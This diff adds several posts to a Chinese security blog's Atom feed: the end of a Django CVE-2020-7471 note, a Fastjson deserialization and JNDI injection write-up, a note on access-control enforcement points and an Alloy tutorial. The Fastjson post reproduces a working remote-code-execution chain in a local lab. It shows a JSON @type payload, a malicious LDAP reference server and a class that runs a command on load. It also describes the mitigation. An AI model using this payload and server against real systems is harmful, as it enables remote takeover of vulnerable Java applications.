+    template = '%(function)s(%(distinct)s%(expressions)s %(ordering)s)'
+    allow_distinct = True
+
+    def __init__(self, expression, delimiter, **extra):
+        delimiter_expr = Value(str(delimiter))
+        super().__init__(expression, delimiter_expr, **extra)
+
+    def convert_value(self, value, expression, connection):
+        if not value:
+            return ''
+        return value
+</code></pre>
+<p>所以修复方式就是尽快升级或者别用postgreSQL</p>
+<h2 id="参考链接">参考链接：</h2>
+<p>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7471</p>
+<p>https://xz.aliyun.com/t/7218</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Fastjson 反序列化 + JNDI 注入 实现远程代码执行]]></title>
+        <id>https://c0n6w3i.github.io/post/fastjson-fan-xu-lie-hua-jndi-zhu-ru-shi-xian-yuan-cheng-dai-ma-zhi-xing/</id>
+        <link href="https://c0n6w3i.github.io/post/fastjson-fan-xu-lie-hua-jndi-zhu-ru-shi-xian-yuan-cheng-dai-ma-zhi-xing/">
+        </link>
+        <updated>2020-06-08T02:43:59.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="0x01-简介">0x01 简介</h2>
+<p>Fastjson 是一个 Java 编写的 JSON 库, 可以用来将 String 转成 Java Object.</p>
+<h2 id="0x02-漏洞概述">0x02 漏洞概述</h2>
+<p>这次是一个由于错误配置引起的的反序列化漏洞, 效果和当年 CVE-2017-18349 差不多. AutoTypeSupport 是 true 的话就可以触发.</p>
+<p>此处演示使用 AutoType 功能实现 JNDI(Java Naming and Directory Interface) 注入, 从而实现RCE.</p>
+<p>当调用 <code>com.alibaba.fastjson.JSON.parse(json);</code> 时 string 会被 DefaultJSONParser.parse 函数解析</p>
+<pre><code class="language-java">    /**
+     *
+     * @since 1.2.38
+     */
+    public static Object parse(String text, ParserConfig config, int features) {
+        if (text == null) {
+            return null;
+        }
+
+        DefaultJSONParser parser = new DefaultJSONParser(text, config, features);
+        Object value = parser.parse();
+
+        parser.handleResovleTask(value);
+
+        parser.close();
+
+        return value;
+    }
+</code></pre>
+<p>之后 string 被传入 parseObject 函数</p>
+<pre><code class="language-java">    public Object parse(Object fieldName) {
+        final JSONLexer lexer = this.lexer;
+        switch (lexer.token()) {
+            // ... //
+            case LBRACE:
+                JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
+                return parseObject(object, fieldName);
+            // ... //
+</code></pre>
+<p>parseObject 函数会识别特殊的 key, 如果 key 是 @type, 该函数就会运行 config.checkAutoType</p>
+<pre><code class="language-java">                if (key == JSON.DEFAULT_TYPE_KEY
+                        &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
+                    String typeName = lexer.scanSymbol(symbolTable, '&quot;');
+                    // ... //
+                    Class&lt;?&gt; clazz = null;
+                    if (object != null
+                            &amp;&amp; object.getClass().getName().equals(typeName)) {
+                        clazz = object.getClass();
+                    } else {
+                        // ... //
+                        if (!allDigits) {
+                            clazz = config.checkAutoType(typeName, null, lexer.getFeatures());
+                        }
+                    }
+
+</code></pre>
+<p>checkAutoType 首先会 hash ClassName, 然后检查 hash 值不在白名单, acceptHashCodes 和 denyHashCodes 里. 经过各种检查后, class 将会被读入 clazz 变量</p>
+<pre><code class="language-java">        final int mask = Feature.SupportAutoType.mask;
+        boolean autoTypeSupport = this.autoTypeSupport
+                || (features &amp; mask) != 0
+                || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != 0;
+
+        if (autoTypeSupport || jsonType || expectClassFlag) {
+            boolean cacheClass = autoTypeSupport || jsonType;
+            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
+        }
+        // ... //
+        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);
+
+</code></pre>
+<p>之后检查 autoTypeSupport, 如果没开的话就会抛出异常, 如果开了的话就会返回 clazz.</p>
+<pre><code class="language-java">        if (!autoTypeSupport) {
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        }
+</code></pre>
+<p>最后会反序列化 clazz, 会在 JavaBeanDeserializer.class 里赋值, 然后返回 object. 一些类的method在deserialze的时候就会被执行了.</p>
+<pre><code class="language-java">                    ObjectDeserializer deserializer = config.getDeserializer(clazz);
+                    Class deserClass = deserializer.getClass();
+                    if (JavaBeanDeserializer.class.isAssignableFrom(deserClass)
+                            &amp;&amp; deserClass != JavaBeanDeserializer.class
+                            &amp;&amp; deserClass != ThrowableDeserializer.class) {
+                        this.setResolveStatus(NONE);
+                    } else if (deserializer instanceof MapDeserializer) {
+                        this.setResolveStatus(NONE);
+                    }
+                    Object obj = deserializer.deserialze(this, clazz, fieldName);
+                    return obj;
+</code></pre>
+<p>如果有 $ref 的话, parse 完之后会运行 handleResovleTask 函数. 然后运行 eval 函数</p>
+<pre><code class="language-java">                if (refValue == null) {
+                    try {
+                        JSONPath jsonpath = JSONPath.compile(ref);
+                        if (jsonpath.isRef()) {
+                            refValue = jsonpath.eval(value);
+                        }
+                    } catch (JSONPathException ex) {
+                        // skip
+                    }
+                }
+</code></pre>
+<p>eval 函数会运行getPropertyValue 函数 经过各种加载之后会执行 org.apache.shiro.jndi.JndiObjectFactory 的 getInstance 函数, 进而执行 lookup 函数.</p>
+<pre><code class="language-java">    public T getInstance() {
+        try {
+            if(requiredType != null) {
+                return requiredType.cast(this.lookup(resourceName, requiredType));
+            } else {
+                return (T) this.lookup(resourceName);
+            }
+</code></pre>
+<p>从这里开始就是 JNDI 注入攻击了</p>
+<p>可以配置一个含有恶意代码的 Naming/Directory service 然后给 resourceName 赋值成恶意代码的 URL. 当执行 lookup 时, 程序会接收并运行恶意代码.</p>
+<h2 id="0x03-影响版本">0x03 影响版本</h2>
+<p>Fastjson &lt;= 1.2.66</p>
+<h2 id="0x04-环境搭建">0x04 环境搭建</h2>
+<p>目录结构：<br>
+<img src="https://c0n6w3i.github.io//post-images/1591627649611.png" alt="" loading="lazy"></p>
+<p>pom 文件:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+
+&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+  &lt;groupId&gt;test&lt;/groupId&gt;
+  &lt;artifactId&gt;test&lt;/artifactId&gt;
+  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+
+  &lt;name&gt;test&lt;/name&gt;
+  &lt;!-- FIXME change it to the project's website --&gt;
+  &lt;url&gt;http://www.example.com&lt;/url&gt;
+
+  &lt;properties&gt;
+    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
+    &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt;
+    &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt;
+  &lt;/properties&gt;
+
+  &lt;dependencies&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;junit&lt;/groupId&gt;
+      &lt;artifactId&gt;junit&lt;/artifactId&gt;
+      &lt;version&gt;4.11&lt;/version&gt;
+      &lt;scope&gt;test&lt;/scope&gt;
+    &lt;/dependency&gt;
+
+    &lt;!-- ldap --&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;com.unboundid&lt;/groupId&gt;
+      &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;
+      &lt;version&gt;3.1.1&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;!-- fastjson --&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
+      &lt;version&gt;1.2.66&lt;/version&gt;
+    &lt;/dependency&gt;
+
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;
+      &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;
+      &lt;version&gt;1.5.1&lt;/version&gt;
+    &lt;/dependency&gt;
+    
+  &lt;/dependencies&gt;
+
+
+
+  &lt;build&gt;
+    &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;
+      &lt;plugins&gt;
+        &lt;!-- clean lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#clean_Lifecycle --&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt;
+          &lt;version&gt;3.1.0&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;!-- default lifecycle, jar packaging: see https://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_jar_packaging --&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;
+          &lt;version&gt;3.0.2&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;
+          &lt;version&gt;3.8.0&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;
+          &lt;version&gt;2.22.1&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;
+          &lt;version&gt;3.0.2&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt;
+          &lt;version&gt;2.5.2&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt;
+          &lt;version&gt;2.8.2&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;!-- site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle --&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-site-plugin&lt;/artifactId&gt;
+          &lt;version&gt;3.7.1&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-project-info-reports-plugin&lt;/artifactId&gt;
+          &lt;version&gt;3.0.0&lt;/version&gt;
+        &lt;/plugin&gt;
+      &lt;/plugins&gt;
+    &lt;/pluginManagement&gt;
+  &lt;/build&gt;
+&lt;/project&gt;
+
+</code></pre>
+<p>使用下面的代码搭建一个 LDAP 服务, RMI 也行, 不过高级JDK 对 RMI 限制很多.<br>
+https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/</p>
+<p>此处用到 server 代码如下 (代码来自于上面的链接，侵删)</p>
+<pre><code class="language-java">package test;
+
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+
+
+public class LdapServer {
+
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+
+
+    public static void main (String[] args) {
+
+        String url = &quot;http://127.0.0.1:8000/#Notepad&quot;;
+        int port = 1234;
+
+
+        try {
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    &quot;listen&quot;,
+                    InetAddress.getByName(&quot;0.0.0.0&quot;),
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
+            ds.startListening();
+
+        }
+        catch ( Exception e ) {
+            e.printStackTrace();
+        }
+    }
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+
+        private URL codebase;
+
+
+        /**
+         *
+         */
+        public OperationInterceptor ( URL cb ) {
+            this.codebase = cb;
+        }
+
+
+        /**
+         * {@inheritDoc}
+         *
+         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
+         */
+        @Override
+        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+            try {
+                sendResult(result, base, e);
+            }
+            catch ( Exception e1 ) {
+                e1.printStackTrace();
+            }
+
+        }
+
+
+        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
+            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(&quot;.class&quot;));
+            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);
+            e.addAttribute(&quot;javaClassName&quot;, &quot;Notepad&quot;);
+            String cbstring = this.codebase.toString();
+            int refPos = cbstring.indexOf('#');
+            if ( refPos &gt; 0 ) {
+                cbstring = cbstring.substring(0, refPos);
+            }
+            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);
+            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);
+            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+
+    }
+}
+</code></pre>
+<p>需要远程执行的代码：</p>
+<pre><code class="language-java">public class Notepad {
+    static {
+      try {
+        System.out.println(&quot;run notepad...&quot;);
+        Runtime.getRuntime().exec(&quot;C:\\Windows\\System32\\notepad.exe&quot;);
+      } catch (Throwable e) {
+        e.printStackTrace();
+      }
+    }
+  }
+</code></pre>
+<h2 id="0x05-漏洞复现">0x05 漏洞复现</h2>
+<p>Poc：<br>
+https://github.com/threedr3am/learnjavabug/tree/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce</p>
+<p>此处分析用到的payload (代码来自于上面的链接，侵删)</p>
+<pre><code class="language-JSON">{
+    &quot;@type&quot;: &quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,
+    &quot;resourceName&quot;: &quot;ldap://127.0.0.1:1234/1&quot;,
+    &quot;test&quot;: {
+        &quot;$ref&quot;: &quot;$.instance&quot;
+    }
+}
+</code></pre>
+<p>Victim代码:</p>
+<pre><code class="language-java">package poc;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+public class App {
+  public static void main(String[] args) throws Exception {
+    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+    String str = &quot;{\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://127.0.0.1:1234/1\&quot;,\&quot;test\&quot;:{\&quot;$ref\&quot;:\&quot;$.instance\&quot;}}&quot;;
+    JSON.parse(str);
+  }
+}
+</code></pre>
+<p>先运行 server 代码, 再运行 victim 代码<br>
+运行结果:</p>
+<figure data-type="image" tabindex="1"><img src="https://c0n6w3i.github.io//post-images/1591627692333.jpg" alt="" loading="lazy"></figure>
+<h2 id="0x06-修复方式">0x06 修复方式</h2>
+<p>AutoType 默认关闭, 不过要用到的话需要确保 AutoTypeSupport 设置正确, 删除 <code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></p>
+<h2 id="参考链接">参考链接：</h2>
+<p>https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/</p>
+<p>https://github.com/threedr3am/learnjavabug/tree/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[访问控制 Policy Enforcement Point 杂谈]]></title>
+        <id>https://c0n6w3i.github.io/post/fang-wen-kong-zhi-policy-enforcement-point-za-tan/</id>
+        <link href="https://c0n6w3i.github.io/post/fang-wen-kong-zhi-policy-enforcement-point-za-tan/">
+        </link>
+        <updated>2020-05-18T21:33:54.000Z</updated>
+        <content type="html"><![CDATA[<p>本科毕业论文中的一部分涉及到 Policy Enforcement Point。因为这块资料找起来特别麻烦, 就记录一下避免遗忘。</p>
+<h2 id="访问控制里的-policy-enforcement-point">访问控制里的 Policy Enforcement Point</h2>
+<p>一般会认为 Policy Enforcement Point(PEP) 是基于属性的访问控制(ABAC)里的一个子系统，毕竟ABAC有时候也被称作PBAC(Policy-based Access Control)。不过实际上不管什么访问控制都会有类似这个系统。PEP 主要是负责实施访问控制的结果, 所以有时也被称为Access Control Enforcement Function。</p>
+<h2 id="policy-enforcement-point-实现方式">Policy Enforcement Point 实现方式</h2>
+<p>一般在细粒度访问控制模型里,访问控制的结果通常分三种：<br>
+- 允许: 用户可以获得数据<br>
+- 允许 + 特定条件: 用户可以获得部分数据, 这部分数据要满足特定条件<br>
+- 拒绝: 用户不能获得数据<br>
+而针对细粒度访问控制，并且基本上只有 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">允</mi><mi mathvariant="normal">许</mi><mo>+</mo><mi mathvariant="normal">特</mi><mi mathvariant="normal">定</mi><mi mathvariant="normal">条</mi><mi mathvariant="normal">件</mi></mrow><annotation encoding="application/x-tex">允许 + 特定条件</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">允</span><span class="mord cjk_fallback">许</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0em;vertical-align:0em;"></span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">件</span></span></span></span> 这种情况下的PEP一般会分两种，Post-Processing 和 Pre-Processing。</p>
+<h3 id="post-processing">Post-Processing</h3>
+<p>Post-Processing 主要是在数据返回给用户前改变数据，根据访问控制的结果去掉一些数据。一般实现这种需要目标服务有语句执行完之后的hook，或者在目标服务外面套一层。好像大部分数据库的访问控制系统都是采取的这种方式。</p>
+<h3 id="pre-processing">Pre-Processing</h3>
+<p>Pre-Processing 和 Post-Processing 相反， 主要是在语句运行前对语句做处理，从而达到过滤数据的目的。这种方法不需要目标服务支持， 并且可以适配多种服务。</p>
+<p>不过直接修改类似SQL语句很容易出错，并且也会破环语句本身的意思，所以Pre-Processing 还可以被细分成Truman Model 和Non-Truman Model。</p>
+<h3 id="query-modification">Query modification</h3>
+<p>Query modification 就是根据访问控制规则修改语句。Truman Model 全称是Truman's World Model。 它主要是给用户提供一个仅包含可访问数据的视图（view）然后用户通过视图来查询数据。Oracle 的 Virtual Private Database（VPD）就是一种典型的 Truman Model。</p>
+<p>这种方法实际上是有缺陷的， 首先设计视图要花很长时间。并且用户在运行一些带有聚合类函数的语句时，执行结果可能会误导用户。举个例子：<br>
+假设有一个表A:</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>成绩</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>10</td>
+</tr>
+<tr>
+<td>1</td>
+<td>10</td>
+</tr>
+<tr>
+<td>2</td>
+<td>0</td>
+</tr>
+</tbody>
+</table>
+<p>并且规定用户只能查询自己ID对应的成绩.<br>
+当用户 0 运行查询语句 <code>SELECT * FROM A</code> 时, Truman model 会仅返回:</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>成绩</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>10</td>
+</tr>
+</tbody>
+</table>
+<p>然而 当用户 0 运行查询语句 <code>SELECT AVG(成绩)FROM A</code> 时, Truman model 会返回 10, 因为根据访问控制规则, 用户 0 的视图中仅存在 1 条数据. 但是这个结果是错误的, 并且会让用户 0 觉得平均成绩就是 10.<br>
+总而言之, Truman model 在语句包含聚合类函数的时候会返回会误导人的结果. 为了解决这个问题, XXX 引入了 Non-Truman model 也就是 Query validation 的一种.</p>
+<h3 id="query-validation">Query validation</h3>
+<p>未完待续...</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Alloy Intro]]></title>
+        <id>https://c0n6w3i.github.io/post/alloy-intro/</id>
+        <link href="https://c0n6w3i.github.io/post/alloy-intro/">
+        </link>
+        <updated>2019-12-28T05:13:01.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1>
+<p>给大家整点软件理论里Formal method的活. 需要证明软件可靠性和安全性之类的时候就可以用这个.</p>
+<h2 id="0x01-什么是alloy">0x01 什么是Alloy</h2>
+<p>Alloy是由MIT开发的软件模型分析工具。主要用将软件逻辑抽象化，然后检查软件逻辑是否符合预期，是<strong>formal method</strong>工具之一。<br>
+Alloy可用于：</p>
+<ol>
+<li>检查软件中各个元素的关系</li>
+<li>检查软件逻辑是否符合预期</li>
+<li>生成反例</li>
+<li>用SAT分析软件行</li>
+</ol>
+<h3 id="alloy下载安装">Alloy下载安装</h3>
+<p>推荐使用VSCode的<a href="https://marketplace.visualstudio.com/items?itemName=ArashSahebolamri.alloy">Alloy插件</a>。不过这个插件使用的是定制化的jar包。如果要使用指定版本的Alloy的话需要到<a href="https://alloytools.org/">官网</a>下载。VSCode也有<a href="https://marketplace.visualstudio.com/items?itemName=DongyuZhao.alloy-vscode">Alloy语法高亮插件</a>。</p>
+<h2 id="0x02-alloy语法">0x02 Alloy语法</h2>
+<h5 id="例子">例子：</h5>
+<p>Alloy的例子可以在<a href="https://github.com/AlloyTools/org.alloytools.alloy/tree/master/org.alloytools.alloy.extra/extra/models">GitHub</a>找到。</p>
+<h5 id="alloy-运算符">Alloy 运算符：</h5>
+<p>Alloy 的运算符和普通编程语言有细微差别</p>
+<h6 id="复合表达">复合表达</h6>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>~r</td>
+<td>左右上下翻转</td>
+</tr>
+<tr>
+<td>^r</td>
+<td>传递（不包含自身）</td>
+</tr>
+<tr>
+<td>*r</td>
+<td>传递（包含自身）</td>
+</tr>
+<tr>
+<td>#r</td>
+<td>r里元素的数量</td>
+</tr>
+<tr>
+<td>a.b</td>
+<td>a join b</td>
+</tr>
+<tr>
+<td>b[a]</td>
+<td>a join b</td>
+</tr>
+<tr>
+<td>a -&gt; b</td>
+<td>a 和 b 的笛卡尔集</td>
+</tr>
+<tr>
+<td>a&amp;b</td>
+<td>a <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∩</mo></mrow><annotation encoding="application/x-tex">\cap</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∩</span></span></span></span> b</td>
+</tr>
+<tr>
+<td>a+b</td>
+<td>a <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∪</mo></mrow><annotation encoding="application/x-tex">\cup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∪</span></span></span></span> b</td>
+</tr>
+<tr>
+<td>a-b</td>
+<td>a <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">\</mi></mrow><annotation encoding="application/x-tex">\backslash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">\</span></span></span></span> b</td>
+</tr>
+<tr>
+<td>no</td>
+<td>不存在</td>
+</tr>
+<tr>
+<td>a&amp;b</td>
+<td>a 和 b 的交集</td>
+</tr>
+</tbody>
+</table>
+<h6 id="原子公式">原子公式</h6>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>r in s</td>
+<td>r <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⊆</mo></mrow><annotation encoding="application/x-tex">\subseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊆</span></span></span></span> s</td>
+</tr>
+<tr>
+<td>r = s</td>
+<td>集合 r 和 s 含有相同的元素</td>
+</tr>
+</tbody>
+</table>
+<h6 id="复合公式">复合公式</h6>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>!f</td>
+<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">¬</mi><mi>f</mi></mrow><annotation encoding="application/x-tex">\lnot f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">¬</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span></span></span></span></td>
+</tr>
+<tr>
+<td>f &amp;&amp; g</td>
+<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo>∧</mo><mi>g</mi></mrow><annotation encoding="application/x-tex">f \land g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span></td>
+</tr>
+<tr>
+<td>f || g</td>
+<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo>∨</mo><mi>g</mi></mrow><annotation encoding="application/x-tex">f \lor g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span></td>
+</tr>
+<tr>
+<td>f =&gt; g</td>
+<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo>→</mo><mi>g</mi></mrow><annotation encoding="application/x-tex">f \to g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span></td>
+</tr>
+<tr>
+<td>f &lt;=&gt; g</td>
+<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mtext>  </mtext><mo>⟺</mo><mtext>  </mtext><mi>g</mi></mrow><annotation encoding="application/x-tex">f \iff g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟺</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span></td>
+</tr>
+<tr>
+<td>some r</td>
+<td>r 包含至少一个元素</td>
+</tr>
+<tr>
+<td>one r</td>
+<td>r 只包含一个元素</td>
+</tr>
+<tr>
+<td>lone r</td>
+<td>r 包含最多一个元素</td>
+</tr>
+<tr>
+<td>no r</td>
+<td>r 包含零个元素</td>
+</tr>
+<tr>
+<td>all x: a | f</td>
+<td>集合a里的每一个元素x使f成立</td>
+</tr>
+<tr>
+<td>some x: a | f</td>
+<td>集合a里的至少一个元素x使f成立</td>
+</tr>
+<tr>
+<td>one x: a | f</td>
+<td>集合a里的只有一个元素x使f成立</td>
+</tr>
+<tr>
+<td>lone x: a | f</td>
+<td>集合a里的最多一个元素x使f成立</td>
+</tr>
+<tr>
+<td>no x: a | f</td>
+<td>集合a里的没有一个元素x使f成立</td>
+</tr>
+</tbody>
+</table>
+<h5 id="module">Module：</h5>
